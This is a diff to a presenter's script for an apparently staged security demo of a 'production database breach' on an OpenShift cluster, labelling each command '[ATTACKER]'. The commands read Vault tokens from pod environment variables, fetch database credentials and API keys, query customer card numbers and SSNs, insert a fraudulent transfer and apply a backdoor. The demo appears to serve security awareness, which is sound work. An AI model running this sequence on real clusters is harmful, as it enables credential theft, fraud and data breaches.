@@ -11,11 +11,13 @@ This is a **pure terminal session** with typing animation. Commands type out cha
 ## How It Works
 
 1. **Output displays**
-2. **Blank `$ ` prompt appears**
+2. **Blank `[ATTACKER] $ ` prompt appears**
 3. **You press Enter** (silently)
 4. **Command types out** character-by-character
 5. **Command executes** and shows real output
 6. **You narrate** what just happened
+
+**Note:** The `[ATTACKER]` prefix makes it clear these are commands run by a malicious actor.
 
 **No commentary in the script - just commands and output. You provide all narration.**
 
@@ -41,10 +43,10 @@ Press Enter when you see blank `$ ` prompts.
           PRODUCTION DATABASE BREACH - Live OpenShift Cluster
 ================================================================================
 
-$ oc get pods -n production
-$ oc get deployment payment-processor -n production
-$ export POD=payment-processor-xxxxx
-$ echo "Target pod: $POD"
+[ATTACKER] $ oc get pods -n production
+[ATTACKER] $ oc get deployment payment-processor -n production
+[ATTACKER] $ export POD=payment-processor-xxxxx
+[ATTACKER] $ echo "Target pod: $POD"
 ```
 
 **What to say:**
@@ -57,7 +59,7 @@ $ echo "Target pod: $POD"
 ### Phase 1: Credential Discovery
 
 ```
-$ oc exec -n production $POD -- printenv | grep -i vault
+[ATTACKER] $ oc exec -n production $POD -- printenv | grep -i vault
 ```
 
 **Output shows:**
@@ -80,7 +82,7 @@ VAULT_ADDR=http://vault...
 ### Phase 2: Vault Access - Database Credentials
 
 ```
-$ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/database/production | jq .data.data'
+[ATTACKER] $ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/database/production | jq .data.data'
 ```
 
 **Output shows:**
@@ -107,7 +109,7 @@ $ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN"
 ### Phase 3: Vault Access - API Keys
 
 ```
-$ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'
+[ATTACKER] $ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN" $VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'
 ```
 
 **Output shows:**
@@ -132,7 +134,7 @@ $ oc exec -n production $POD -- sh -c 'curl -sf -H "X-Vault-Token: $VAULT_TOKEN"
 ### Phase 4: Database Access - Tables
 
 ```
-$ oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c '\dt'
+[ATTACKER] $ oc exec -n production $POD -- psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c '\dt'
 ```
 
 **Output shows:**
@@ -156,7 +158,7 @@ $ oc exec -n production $POD -- psql -h customer-database.production.svc.cluster
 ### Phase 5: Customer Count
 
 ```
-$ oc exec -n production $POD -- psql ... 'SELECT COUNT(*) as total_customers FROM customers;'
+[ATTACKER] $ oc exec -n production $POD -- psql ... 'SELECT COUNT(*) as total_customers FROM customers;'
 ```
 
 **Output shows:**
@@ -174,7 +176,7 @@ $ oc exec -n production $POD -- psql ... 'SELECT COUNT(*) as total_customers FRO
 ### Phase 6: Customer Data - **THE BIG MOMENT**
 
 ```
-$ oc exec -n production $POD -- psql ... 'SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;'
+[ATTACKER] $ oc exec -n production $POD -- psql ... 'SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;'
 ```
 
 **Output shows:**
@@ -217,7 +219,7 @@ $ oc exec -n production $POD -- psql ... 'SELECT customer_name, email, account_b
 ### Phase 7: Total at Risk
 
 ```
-$ oc exec -n production $POD -- psql ... | xargs echo 'Total at risk: $'
+[ATTACKER] $ oc exec -n production $POD -- psql ... | xargs echo 'Total at risk: $'
 ```
 
 **Output shows:**
@@ -238,7 +240,7 @@ Total at risk: $ 1238652.75
 ### Phase 8: Fraudulent Transaction - **THE CRIME**
 
 ```
-$ oc exec -n production $POD -- psql ... "INSERT INTO transactions ... 'UNAUTHORIZED - Attacker controlled transfer' ..."
+[ATTACKER] $ oc exec -n production $POD -- psql ... "INSERT INTO transactions ... 'UNAUTHORIZED - Attacker controlled transfer' ..."
 ```
 
 **Output shows:**
@@ -259,7 +261,7 @@ INSERT 0 1
 ### Phase 9: Transaction History
 
 ```
-$ oc exec -n production $POD -- psql ... 'SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;'
+[ATTACKER] $ oc exec -n production $POD -- psql ... 'SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;'
 ```
 
 **Output shows:**
@@ -288,7 +290,7 @@ $ oc exec -n production $POD -- psql ... 'SELECT * FROM transactions ORDER BY cr
 ### Phase 10: Backdoor Deployment
 
 ```
-$ oc apply -f /tmp/backdoor.yaml
+[ATTACKER] $ oc apply -f /tmp/backdoor.yaml
 ```
 
 **Output shows:**
@@ -479,7 +481,7 @@ local delay="0.05"  # Make smaller for faster, bigger for slower
 ## Phase 1: Protected Pod Discovery
 
 ```
-$ export PROTECTED_POD=payment-processor-protected-xxxxx
+[ATTACKER] $ export PROTECTED_POD=payment-processor-protected-xxxxx
 $ echo "Protected pod: $PROTECTED_POD"
 ```
 
